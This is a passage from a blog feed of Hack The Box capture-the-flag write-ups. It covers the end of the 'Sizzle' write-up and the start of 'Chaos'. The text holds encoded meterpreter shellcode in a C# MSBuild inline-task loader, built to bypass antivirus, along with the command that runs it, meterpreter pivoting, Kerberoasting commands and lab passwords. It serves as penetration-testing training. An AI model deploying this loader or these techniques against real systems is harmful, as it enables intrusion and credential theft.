0xc9,0x2c,0x5a,0x32,0x23,0x56,0x46,0x00,0xdc,0x8e,0x00,0x4c,0xe0,0x1a,0x04,
0xd5,0x04,0x1b,0xee,0xc5,0x90,0x2d,0x9f,0x68,0xf5,0x11,0x48,0xcf,0x2d,0x85,
0xef,0xe9,0x2b,0xc8,0x3f,0xf3,0x07,0x12,0xd7,0x23,0x93,0x5f,0x2d,0xab,0xe3,
0x9a,0x37,0x42,0xf1,0xd2,0x7e,0xdc,0x6c,0x30,0x35,0x75,0xf6,0x1a,0x1c,0x8f,
0x59,0x92,0x38,0xc7,0xb7,0x05,0xbd,0x76,0x31,0x21,0x6f,0x4c,0x6f,0x54,0xde,
0x5e,0x4a,0xb0,0x1d,0xec,0xcb,0xd2,0x13,0x28,0xcc,0xf7,0xd8,0x13,0xac,0xcf,
0x03,0x34,0xd7,0x4d,0xa2,0xdf,0x21,0x84,0x1d,0xf5,0xcc,0x64,0x8f,0x97,0xd7,
0x2b,0xa2,0x89,0xb4,0x6e,0x8d,0xb0,0x0b,0xc0,0x09,0x43,0xa2,0xbe,0x97,0xe5,
0x1d,0x58,0xe0,0x3f,0xb5,0xe5,0xe2,0xc0,0x3a,0x8e,0x2e,0xfc,0x90,0x2a,0x06,
0xaa,0xe4,0x97,0x53,0x70,0x70,0xa4,0xf2,0xce,0x8f,0x11,0x57,0x05,0xe4,0x39,
0x4c,0xf2,0x7b,0x1a,0x45,0xd1,0xce,0xc9,0xf4,0x20,0xf2,0xbd,0x13,0xdf,0xc2,
0x65,0xd0,0x5c,0x4e,0x77,0xe4,0x59,0x3d,0xa5,0xb5,0x8b,0x05,0x6d,0x9d,0x61,
0x72,0x17,0xde,0x9c,0xfd,0x4d,0x30,0x8a,0x51,0xa8,0xf6,0x47,0x85,0xff,0x7e,
0x74,0x88,0x8b,0x10,0xa1,0xee,0xaf,0xef,0xb5,0x53,0xe2,0x5c,0x36,0x8a,0x54,
0xa0,0xf5,0xd0,0x4b,0x5f,0x0e,0x74,0x49,0x72,0x9e,0xc5,0x66,0xbd,0xca,0x2d,
0x20,0x16,0x16,0x1c,0x83,0x59,0x08,0xbb,0x5b,0x1d,0x8f,0x91,0xda,0xb5,0xa7,
0xe6,0xda,0xb7,0xfb,0x8a,0x32,0xc3,0x2f,0x73,0xe0,0x27,0x4c,0x07,0x19,0x49,
0xf8,0x55,0xba,0x69,0x64,0xf9,0xad,0xd5,0x2a,0xa5,0xab,0xfd,0x3b,0x5c,0x7d,
0x73,0xc7,0xf9,0x65,0x62,0xc3,0xc6,0xd7,0x3f,0x10,0x9e,0x0d,0x35,0x52,0xb7,
0x4e,0x17,0xdf,0x7d,0x59,0x47,0xfb,0xf1,0x02,0x58,0x25,0xf6,0xe9,0x59,0x9c,
0xf6,0x70,0xc4,0x19,0x66,0x01,0x81,0xb5,0xde,0x7a,0x28,0xbf,0x45,0x66,0xc5,
0x96,0x7e,0x55,0x09,0x21,0x58,0x7c,0xcf,0x34,0x66,0x67,0x9e,0xd3,0x55,0x63,
0x3f,0x01,0x1f,0x14,0x42,0x4b,0x29,0xca,0x89,0x27,0xc7,0x0f,0x77,0xb0,0xe6,
0x13,0x3d,0x37,0x15,0xc0,0x2b,0x5e,0x40,0x20,0x86,0x30,0x0d,0xc5,0x46,0x98,
0xab,0xb0,0x2b,0x92,0xc5,0x22,0x21,0x92,0xf6,0x1c,0x03,0x27,0x0a,0x7c,0x84,
0x4b,0x54,0x0a,0xf3,0x6e,0xc6,0x50,0xe5,0xf6,0x28,0x9b,0x7d,0xa5,0xa3,0x21,
0x75,0xaa,0xb0,0xd7,0xf3,0xa0,0xa5,0xd0,0x7f,0x90,0x75,0xf1,0x16,0x8b,0x98,
0x70,0x15,0x5a,0xc5,0x58,0x38,0xc1,0xaf,0x87,0xbb,0xce,0x65,0x2f,0x6d,0xb1,
0x2d,0x69,0x47,0x4d,0x34,0xf9,0x02,0xb9,0x66,0x4f,0x93,0xe2,0x7c,0x26,0x76,
0x01,0x12,0x1e,0x86,0x81,0x69,0x8d,0xa5,0x31,0x67,0x1b,0x61,0x5b,0x02,0xb4,
0x21,0xa9,0x70,0xbe,0xbb,0x23,0x22,0x6d,0x1d,0xc8,0x19,0x23,0x41,0xfc,0x6c,
0x41,0x12,0x17,0xbf,0x99,0x4e,0x9c,0xc2,0x5c,0x18,0xbf,0xcc,0x1a,0xb4,0x2d,
0x9e,0x26,0xa5,0x7d,0x1e,0xdc,0x50,0x1f,0xd9,0x0a,0x79,0xf3,0x29,0x16,0xb6,
0x49,0xda,0x55,0x51,0xc9,0x54,0x2e,0x46,0x68,0x9b,0xec,0x3b,0xd4,0x61,0x27,
0x50,0x3a,0x47,0x74,0x62,0x07,0x0f,0x83,0xcd,0xc2,0x26,0x20,0xb7,0xa3,0xd7,
0x0e,0xa6,0x6c,0xfd,0xb0,0x2f,0xd5,0x0f,0x6f,0x35,0x5d,0x4f,0x2b,0x14,0xe7,
0xca,0x6f,0x78,0x0e,0xfb,0x09,0x5c,0x25,0x0c,0x99,0xc4,0xa5,0x92,0x30,0x3e,
0xbb,0x4c,0x46,0xa9,0xa0,0xe6,0xf0,0x75,0x12,0xad,0x6c,0xc1,0xef,0xcc,0xf2,
0x67,0x5f,0x22,0xff,0xa1,0x53,0xad,0xc5,0x57,0x8b,0xcc,0x0a,0xd5,0x94,0xa8,
0x91,0x41,0xc2,0x47,0xd5,0xa1,0x27,0x1f,0x0b,0x47,0x2d,0xa8,0xf4,0xc6,0xdb,
0x5d,0x17,0x36,0x44,0x23,0x26,0x30,0xa8,0xd6,0x97,0x93,0xf2,0x48,0x7c,0x34,
0xbd,0x94,0xb9,0xa2,0x5e,0x78,0x66,0xde,0xbf,0x31,0x7e,0x5a,0x7f,0xbc,0xe9,
0xaa,0x7a,0x00,0xaa,0x8f,0xc8,0x15,0x65,0x84,0x6c,0x1e,0x95,0x43,0xc3,0x82,
0x0a,0x65,0x16,0x73,0xe3,0x47,0xe6,0xfa,0x62,0x80,0x9f,0xa9,0x28,0x8c,0x4c,
0xbd,0xe2,0xbb,0x82,0x8b,0xd1,0x80,0x00,0x84,0x6d,0x8d,0x80,0x4e,0x7d,0xce,
0x84,0x91,0x94,0x74,0x8c,0x30,0xc9,0x49,0x59,0x7b,0x9c,0x0d,0x06,0x60,0x3d,
0x12,0xaf,0x55,0x33,0x12,0x51,0xcb,0x05,0x53,0x8b,0x29,0xcb,0xd5,0xd2,0x00,
0xc7,0x73,0xda,0x2a,0x5a,0x6d,0x34,0xed,0x5d,0x61,0xec,0xb0,0xe6,0x0a,0x23,
0x61,0xa9,0xd5,0x1d,0x97,0x01,0x0b,0x98,0xfe,0x8b,0xad,0x16,0x2e,0x96,0x87,
0xd8,0x86,0xc3,0x46,0xeb,0xd0,0x41,0x6c,0x10,0xa4,0xd2,0xdf,0x07,0x4e,0x7f,
0x65,0x66,0x99,0x40,0x5f,0xdb,0x8d,0x85,0xd4,0x0d,0x1a,0xe3,0x5f,0x3a,0x38,
0x5c,0x4e,0xeb,0xa1,0x5a,0xfc,0x46,0x78,0xc6,0xa6,0x3d,0x6a,0x04,0x2a,0x07,
0xf5,0x3d,0xac,0x08,0xe9,0x22,0x13,0xa9,0x75,0x78,0x81,0xd1,0x3c,0x93,0x4b,
0x44,0x18,0x8b,0xfa,0xef,0xa2,0xb4,0x91,0x52,0xae,0x4b,0xae,0xf2,0x8e,0xdf,
0xac,0x96,0xf1,0xde,0x18,0x40,0x5f,0x13,0x5c,0xe6,0xa8,0x39,0x04,0x05,0x00,
0x53,0xfb,0x69,0x4c,0x93,0x0a,0x88,0x25,0x28,0xbc,0xdd,0xde,0xc6,0xcf,0x55,
0x7e,0x7b,0xef,0x95,0x34,0x6b,0x0d,0x04,0x4d,0x02,0xd9,0x6e,0x86,0xce,0xf0,
0x2d,0xd8,0x79,0x68,0xde,0x1c,0xe7,0xf5,0xc4,0x94,0x38,0xc4,0x6a,0xdd,0x2a,
0x37,0x7c,0xfe,0x42,0x2a,0x5d,0xf3,0xae,0xeb,0x09,0x99,0xfa,0x52,0xc4,0x9c,
0x67,0xd7,0x33,0x8b,0x3d,0xc3,0xa3,0x95,0x5d,0x3c,0x83,0x3b,0xcf,0x23,0x25,
0x7f,0xbe,0x42,0x11,0xb8,0x44,0xba,0xf5,0xf7,0xfa,0x76,0xfb,0xe8,0xc5,0x74,
0xa8,0x7e,0x5b,0xef,0xa7,0x98,0x54,0x6f,0x81,0x5f,0x72,0x9f,0x89,0xc1,0xcc,
0x7d,0x93,0xa8,0xee,0x2c,0x41,0x8f,0x09,0xbe,0x3f,0x9e,0xc5,0x9c,0x73,0xaf,
0xe3,0x38,0x67,0x5e,0xa8,0x01,0xd7,0xce,0x5b,0xcb,0x63,0xfc,0x11,0x52,0xbc,
0x5e,0xc8,0xa6,0x79,0x54,0x65,0xf0,0xcf,0xe0,0x10,0xbd,0x90,0x4f,0x89,0xde,
0xd0,0x8c,0xbd,0xbb,0x61,0x46,0xd6,0x5e,0xff,0x90,0x32,0x77,0x0a,0xb4,0x7f,
0x84,0xee,0xbc,0x91,0x62,0x12,0x9d,0x29,0x02,0xcd,0x64,0x3a,0x35,0x06,0x49,
0x4d,0xa3,0xe5,0x00,0x88,0x5f,0xc0,0xa3,0x07,0xcb,0xc7,0x61,0x1b,0x36,0x19,
0x0e,0xe3,0x28,0x35,0x8e,0xa2,0xc3,0xc0,0xa1,0xc9,0x50,0x34,0xe8,0xb4,0x85,
0x9a,0x8d,0x12,0xe3,0x4d,0xaa,0xcb,0x5c,0x5c,0xc8,0xe2,0xcb,0xe9,0x44,0x68,
0x3a,0x82,0x1c,0x53,0xf6,0x54,0xab,0xda,0x85,0xb8,0x9e,0x3a,0xd8,0xce,0x33,
0x13,0xc4,0x24,0xed,0x99,0x83,0xfb,0xb0,0x90,0x63,0xc2,0xa8,0x97,0xbc,0x40,
0xe7,0xc9,0x6d,0x17,0x58,0x54,0xf6,0x72,0x63,0x3a,0x41,0x43,0xe3,0xa6,0xbc,
0x2d,0xd3,0xe0,0x0c,0x9a,0x10,0xcf,0x7a,0x3c,0xad,0xcf,0x6b,0x39,0xb2,0x74,
0x3e,0xef,0xd9,0xc7,0xe7,0x2e,0x46,0x7e,0xb8,0xd6,0x2a,0x54,0x47,0x59,0x0c,
0xe1,0x18,0x90,0xd1,0xa0,0x00,0x76,0x59,0x14,0x86,0xe5,0xb6,0x31,0xf4,0x9b,
0xea,0x01,0x43,0xf0,0x8c,0xc9,0x36,0x9d,0x9d,0x40,0xe1,0x0f,0xcc,0xdd,0xb6,
0x8f,0x49,0xfa,0x2c,0x89,0xb8,0x4e,0x7b,0x18,0x25,0x60,0x7e,0x7f,0x54,0xcc,
0xfa,0x07,0x7a,0x67,0x72,0xb3,0x89,0xf8,0x66,0x41,0x6b,0x34,0x03,0x11,0x12,
0xd1,0xdd,0x39,0x36,0x30,0x23,0xdf,0x87,0xa2,0x65,0x61,0x66,0x1f,0x54,0x3f,
0x46,0xb5,0x74,0x71,0xb9,0x38,0x8a,0xb4,0xa0,0xfc,0x3c,0x43,0xec,0x51,0xc6,
0x6f,0xab,0xde,0x4d,0xd1,0x7e,0x45,0xb5,0x08,0x85,0x41,0x25,0x58,0x02,0x26,
0xdf,0x24,0xcd,0x06,0x41,0x4f,0x96,0xe4,0x13,0x43,0xc0,0x05,0xf7,0xac,0x31,
0x89,0x1d,0x42,0x7d,0x47,0x83,0x3b,0x41,0x64,0xc2,0xba,0x3b,0x38,0xdb,0xde,
0x32,0x26,0x3c,0xe7,0xab,0x5c,0x01,0x37,0x35,0x32,0x1a,0x25,0xa2,0x30,0x69,
0xf0,0x2c,0xfe,0x5a,0x9b,0x94,0xc7,0x3d,0xfb,0x37,0x74,0x4e,0x58,0xef,0x78,
0xd6,0xdf,0xbd,0x18,0x34,0x09,0xd4,0x6d,0xca,0x47,0xb6,0xbf,0x77,0xf8,0x31,
0x2b,0xc2,0x1f,0xf9,0x93,0x98,0xaf,0xe5,0x86,0xe3,0x35,0xc6,0x57,0xdf,0x17,
0x1d,0x0a,0xec,0x3e,0x45,0xb2,0xc8,0xa8,0x45,0x70,0xc2,0x8d,0xe8,0x05,0x68,
0xb2,0xd1,0x36,0x67,0x63,0xd6,0xa9,0x82,0x99,0x14,0x98,0x45,0xc1,0x3c,0x87,
0x21,0xb2,0x6c,0x71,0x72,0xb1,0x80,0x11,0x74,0x05,0xed,0x15,0x96,0x88,0x9b,
0x44,0x16,0x10,0xa7,0x00,0x02,0xf2,0x77,0xa5,0xc1,0xdf,0xe3,0xd9,0xd6,0xf9,
0xfd,0xb0,0x27,0x0a,0x07,0x31,0xf4,0x4f,0x22,0x7d,0xc1,0x20,0xbd,0x87,0x30,
0x99,0xd9,0x52,0xcf,0xa4,0x79,0x10,0x01,0x33,0x59,0xc9,0x89,0xa6,0xd5,0xb8,
0xd0,0xe7,0x80,0x7b,0xe4,0xc3,0x3b,0x9d,0x9c,0x9d,0x9c,0xea,0xba,0xab,0x54,
0x4a,0x87,0xe1,0x7d,0x71,0xe9,0xe9,0xbb,0xd9,0x17,0xdc,0xd3,0x3f,0xbf,0x4c,
0x7f,0xcd,0xde,0xa0,0x64,0x41,0x20,0xb4,0x24,0x30,0x57,0xcf,0xe8,0x04,0xc2,
0xe4,0x7c,0xb2,0xa5,0x28,0x33,0x6c,0xe8,0x7b,0x9a,0xac,0xc9,0x0c,0xb3,0xb7,
0x48,0xbd,0xb3,0x6a,0xf1,0xfc,0x31,0xcb,0x21,0x39,0x32,0x97,0x7b,0x3c,0x9e,
0x66,0xfa,0xca,0xfe,0xa3,0xcb,0x41,0x2f,0x0f,0x4b,0x6d,0x0b,0x54,0x78,0x2e,
0x85,0x51,0xa5,0x51,0x76,0xef,0xf5,0xf3,0xa7,0xff,0x4a,0x5f,0x7b,0x8d,0xb0,
0x15,0x85,0x78,0xbb,0xd3,0x0a,0x21,0x46,0x3f,0xeb,0x6c,0x9b,0xed,0xd5,0x80,
0xaa,0xf2,0x6b,0x48,0xb1,0x88,0x39,0x3c,0xa8,0x68,0x50,0x06,0xb5,0xa5,0x23,
0x6c,0x8e,0x0c,0xa5,0x95,0x38,0x45,0xfc,0xf5,0xe8,0x7a,0xcb,0xf6,0x91,0xd9,
0xbc,0x9a,0x4b,0x1a,0x60,0xb1,0xc6,0xa7,0xc5,0x0e,0x4b,0xc1,0x74,0xc7,0x74,
0x0e,0xe2,0xdb,0xca,0xce,0xee,0xf4,0x5d,0x80,0xa6,0x7f,0x05,0x8c,0xf1,0xa4,
0x63,0x5e,0xd2,0xca,0xb0,0xc0,0xd1,0xb8,0xb1,0x22,0x8e,0x26,0xac,0x55,0xd4,
0x41,0x36,0x42,0xff,0xb6,0xfc,0x87,0x62,0xfe,0x8b,0x4f,0x47,0x83,0xc4,0x93,
0x38,0x7c,0xfb,0x55,0xa3,0xd8,0xc2,0x53,0x1f,0x27,0x47,0x75,0x56,0xfc,0xcd,
0xc9,0x9e,0x08,0xfe,0x35,0x74,0x2a,0xf3,0x27,0x22,0xad,0x8e,0x41,0xde,0xb6,
0xf2,0xf2,0xe8,0xb7,0x82,0x3b,0x66,0x38,0x95,0x46,0x4e,0x35,0x75,0x48,0x86,
0xab,0xdd,0x43,0x08,0xc7,0xcd,0x29,0xac,0x20,0xb5,0x3a,0x75,0x5f,0x39,0x85,
0xf1,0xd4,0xd4,0xf6,0xb6,0x35,0x65,0xc4,0x57,0x05,0x69,0x90,0x9a,0xfb,0x18,
0xee,0x0d,0xd3,0x02,0xae,0x40,0x38,0xac,0xaa,0x40,0x4c,0x9c,0xc9,0x3a,0xca,
0x24,0x09,0xe7,0x0c,0x8c,0x68,0xb5,0x66,0x61,0x78,0xf2,0xd0,0x29,0xea,0x33,
0xeb,0xb5,0x4d,0xc4,0xc8,0x8e,0xf1,0x28,0xdf,0xed,0xee,0xe9,0x29,0xc5,0x91,
0xea,0x1f,0x7d,0x47,0xbd,0xf9,0xde,0x66,0x58 };


              
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          } 
        }     
      ]]&amp;gt;
      &amp;lt;/Code&amp;gt;
    &amp;lt;/Task&amp;gt;
  &amp;lt;/UsingTask&amp;gt;
&amp;lt;/Project&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\windows\system32\spool\drivers\color\shellcode.xml&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-time-it-worked-and-i-got-meterpreter-&quot;&gt;This time it worked and I got &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;kerberoasting-privilege-escalation&quot;&gt;Kerberoasting, Privilege Escalation&lt;/h3&gt;
&lt;h4 id=&quot;now-we-have-a-meterpreter-session-we-can-route-the-internal-subnet-use-a-proxy-then-use-getuserspnspy-and-see-if-any-user-is-kerberoastable-this-technique-is-covered-here&quot;&gt;Now we have a &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; session, we can route the internal subnet, use a proxy then use &lt;code class=&quot;highlighter-rouge&quot;&gt;GetUserSPNs.py&lt;/code&gt; and see if any user is kerberoastable. This technique is covered &lt;a href=&quot;https://www.blackhillsinfosec.com/a-toast-to-kerberoast/&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;first-thing-is-to-configure-proxychains-to-use-port-8080-&quot;&gt;First thing is to configure &lt;code class=&quot;highlighter-rouge&quot;&gt;proxychains&lt;/code&gt; to use port 8080 :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/proxychains.conf&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-use-auxiliaryserversocks4a-to-add-the-route-and-set-up-the-proxy-&quot;&gt;Then we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;auxiliary/server/socks4a&lt;/code&gt; to add the route and set up the proxy :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;route-add-1010100-2552552550-1-this-adds-a-route-of-the-whole-internal-subnet-where-1-is-the-session-number&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;route add 10.10.10.0 255.255.255.0 1&lt;/code&gt; this adds a route of the whole internal subnet where &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; is the session number.&lt;/h4&gt;
&lt;h4 id=&quot;now-we-are-ready-lets-kerberoast-&quot;&gt;Now we are ready. Let’s kerberoast !&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;proxychains GetUserSPNs.py -request -dc-ip 10.10.10.103 HTB.LOCAL/amanda:Ashare1972&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;user-mrlky-was-kerberoastable-and-we-got-a-hash-lets-pass-it-to-john-&quot;&gt;User &lt;code class=&quot;highlighter-rouge&quot;&gt;mrlky&lt;/code&gt; was kerberoastable and we got a hash, let’s pass it to &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password-is-football7-now-we-can-use-secretdumppy-again-and-do-the-same-thing-we-did-before-&quot;&gt;Password is &lt;code class=&quot;highlighter-rouge&quot;&gt;Football#7&lt;/code&gt;, now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;secretdump.py&lt;/code&gt; again and do the same thing we did before :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/43.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/44.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/45.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---chaos&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/chaos/&quot;&gt;Hack The Box - Chaos&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---help&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/help/&quot;&gt;Hack The Box - Help&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Active Directory" /><category term="Windows Exploitation" /><category term="Networking" /><category term="smb" /><summary type="html">Quick Summary Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an smb share, a simple scf file attack with responder and john could give me a password for a user. With that password I could generate a certificate request and get a certificate then a WinRm session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is 10.10.10.103, I added it to /etc/hosts as sizzle.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC sizzle.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 31 19:41:35 2019 as: nmap -sV -sT -sC -o nmapinitial sizzle.htb Nmap scan report for sizzle.htb (10.10.10.103) Host is up (0.15s latency). Not shown: 987 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | SYST: Windows_NT 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:44+00:00; -6s from scanner time. 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. | tls-alpn: | h2 | http/1.1 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:43+00:00; -5s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:42+00:00; -6s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=5/31%Time=5CF1678A%P=i686-pc-linux-gnu%r(DNSVer SF:sionBindReqTCP,20,”\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x0 SF:4bind\0\0\x10\0\x03”); Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/sizzle/0.png" /></entry><entry><title type="html">Hack The Box - Chaos</title><link href="http://localhost:4000/hack-the-box/chaos/" rel="alternate" type="text/html" title="Hack The Box - Chaos" /><published>2019-05-25T00:00:00+02:00</published><updated>2019-05-25T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/chaos</id><content type="html" xml:base="http://localhost:4000/hack-the-box/chaos/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-chaos-retired-and-heres-my-write-up-about-it-chaos-was-a-ctf-style-machine-i-cant-say-that-it-simulated-a-real-life-situation-i-had-fun-solving-this-box-some-steps-were-straightforward-others-were-very-tricky-about-main-steps-to-get-an-initial-shell-as-www-data-we-will-exploit-a-web-application-that-used-latex-after-that-we-will-escalate-privileges-to-another-user-and-escape-rbash-for-root-privilege-escalation-we-will-extract-root-credentials-from-a-firefox-profile-and-get-a-root-shell-its-a-linux-box-and-its-ip-is-101010120-i-added-it-to-etchosts-as-chaoshtb-lets-jump-right-in&quot;&gt;Hey guys today Chaos retired and here’s my write-up about it. Chaos was a CTF-style machine, I can’t say that it simulated a real life situation. I had fun solving this box, some steps were straightforward others were very tricky. About main steps, To get an initial shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; we will exploit a web application that used &lt;a href=&quot;https://en.wikipedia.org/wiki/LaTeX&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LaTeX&lt;/code&gt;&lt;/a&gt;. After that we will escalate privileges to another user and escape &lt;code class=&quot;highlighter-rouge&quot;&gt;rbash&lt;/code&gt;. For root privilege escalation we will extract root credentials from a firefox profile and get a root shell. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.120&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;chaos.htb&lt;/code&gt;. Let’s jump right in.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC chaos.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/chaos/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
